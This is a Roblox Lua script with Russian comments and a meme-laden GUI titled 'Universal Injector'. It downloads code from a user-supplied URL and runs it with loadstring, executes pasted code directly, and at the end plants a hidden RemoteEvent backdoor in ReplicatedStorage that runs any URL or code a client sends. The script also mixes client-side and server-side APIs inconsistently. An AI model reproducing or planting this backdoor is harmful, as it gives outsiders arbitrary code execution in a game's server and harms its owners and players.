local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local ServerStorage = game:GetService("ServerStorage")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Создаем основной GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UniversalInjectorPro"
ScreenGui.Parent = PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Главный фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 600, 0, 500)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Заголовок с мемной фразой
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 70)
Header.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local memes = {
    "ОМГ POCO 😱", 
    "Injector GO BRRRR 💉", 
    "Script Daddy 🎩", 
    "Require King 👑", 
    "Backdoor Slayer ⚔️",
    "Lua God 🧠",
    "Executor Master 🚀",
    "Scripting Legend 🌟"
}

local currentMeme = memes[math.random(1, #memes)]

local Title = Instance.new("TextLabel")
Title.Text = "UNIVERSAL INJECTOR - " .. currentMeme
Title.Size = UDim2.new(1, 0, 1, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 22
Title.Parent = Header

-- Контент инжектора
local InjectorContent = Instance.new("Frame")
InjectorContent.Size = UDim2.new(1, 0, 1, -70)
InjectorContent.Position = UDim2.new(0, 0, 0, 70)
InjectorContent.BackgroundTransparency = 1
InjectorContent.Parent = MainFrame

-- Поле для URL
local UrlInput = Instance.new("TextBox")
UrlInput.PlaceholderText = "Введите URL скрипта для require..."
UrlInput.Size = UDim2.new(0.9, 0, 0, 40)
UrlInput.Position = UDim2.new(0.05, 0, 0.05, 0)
UrlInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
UrlInput.TextColor3 = Color3.fromRGB(255, 255, 255)
UrlInput.Font = Enum.Font.SourceSans
UrlInput.TextSize = 16
UrlInput.Parent = InjectorContent

-- Кнопка выполнения
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Text = "🚀 ВЫПОЛНИТЬ СКРИПТ"
ExecuteButton.Size = UDim2.new(0.9, 0, 0, 50)
ExecuteButton.Position = UDim2.new(0.05, 0, 0.15, 0)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Font = Enum.Font.SourceSansBold
ExecuteButton.TextSize = 18
ExecuteButton.Parent = InjectorContent

-- Прямой ввод кода
local CodeInput = Instance.new("TextBox")
CodeInput.PlaceholderText = "Или введите код напрямую..."
CodeInput.Size = UDim2.new(0.9, 0, 0, 100)
CodeInput.Position = UDim2.new(0.05, 0, 0.3, 0)
CodeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
CodeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
CodeInput.Font = Enum.Font.Code
CodeInput.TextSize = 14
CodeInput.TextWrapped = true
CodeInput.TextXAlignment = Enum.TextXAlignment.Left
CodeInput.TextYAlignment = Enum.TextYAlignment.Top
CodeInput.Parent = InjectorContent

-- Консоль вывода
local OutputConsole = Instance.new("ScrollingFrame")
OutputConsole.Size = UDim2.new(0.9, 0, 0, 150)
OutputConsole.Position = UDim2.new(0.05, 0, 0.55, 0)
OutputConsole.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
OutputConsole.BorderSizePixel = 0
OutputConsole.Parent = InjectorContent

local OutputText = Instance.new("TextLabel")
OutputText.Size = UDim2.new(1, 0, 1, 0)
OutputText.BackgroundTransparency = 1
OutputText.TextColor3 = Color3.fromRGB(0, 255, 0)
OutputText.Font = Enum.Font.Code
OutputText.TextSize = 14
OutputText.TextXAlignment = Enum.TextXAlignment.Left
OutputText.TextYAlignment = Enum.TextYAlignment.Top
OutputText.TextWrapped = true
OutputText.Text = "Инжектор готов к работе! " .. currentMeme
OutputText.Parent = OutputConsole

-- Функция для выполнения require-скриптов
local function requireScript(url)
    local success, scriptContent = pcall(function()
        return HttpService:GetAsync(url, true)
    end)
    
    if success then
        local executeSuccess, result = pcall(function()
            return loadstring(scriptContent)()
        end)
        
        if executeSuccess then
            local newMeme = memes[math.random(1, #memes)]
            OutputText.Text = OutputText.Text .. "\n[УСПЕХ] Скрипт выполнен! " .. newMeme
            if result then
                OutputText.Text = OutputText.Text .. "\nРезультат: " .. tostring(result)
            end
        else
            OutputText.Text = OutputText.Text .. "\n[ОШИБКА] " .. result .. " 😢"
        end
    else
        OutputText.Text = OutputText.Text .. "\n[ОШИБКА] Не удалось загрузить скрипт: " .. scriptContent
    end
end

-- Функция для выполнения прямого кода
local function executeCode(code)
    local success, result = pcall(function()
        return loadstring(code)()
    end)
    
    if success then
        local newMeme = memes[math.random(1, #memes)]
        OutputText.Text = OutputText.Text .. "\n[УСПЕХ] Код выполнен! " .. newMeme
        if result then
            OutputText.Text = OutputText.Text .. "\nРезультат: " .. tostring(result)
        end
    else
        OutputText.Text = OutputText.Text .. "\n[ОШИБКА] " .. result .. " 💀"
    end
end

-- Обработчики событий
ExecuteButton.MouseButton1Click:Connect(function()
    if UrlInput.Text ~= "" then
        requireScript(UrlInput.Text)
    elseif CodeInput.Text ~= "" then
        executeCode(CodeInput.Text)
    else
        OutputText.Text = OutputText.Text .. "\n[INFO] Введите URL или код для выполнения"
    end
end)

-- Автоматическое обновление мемов каждые 10 секунд
spawn(function()
    while true do
        wait(10)
        local newMeme = memes[math.random(1, #memes)]
        Title.Text = "UNIVERSAL INJECTOR - " .. newMeme
        OutputText.Text = OutputText.Text .. "\n" .. newMeme .. " 🎉"
    end
end)

-- Анимация появления
MainFrame.Visible = true
for i = 0, 1, 0.1 do
    MainFrame.BackgroundTransparency = 1 - i
    wait(0.02)
end

-- Функция для создания бэкдора (скрытая функция)
local function createHiddenBackdoor()
    local backdoorEvent = Instance.new("RemoteEvent")
    backdoorEvent.Name = "UniversalInjectorBackdoor"
    backdoorEvent.Parent = ReplicatedStorage
    
    backdoorEvent.OnServerEvent:Connect(function(player, command, isRequire)
        if isRequire then
            requireScript(command)
        else
            executeCode(command)
        end
    end)
end

-- Создаем скрытый бэкдор
createHiddenBackdoor()
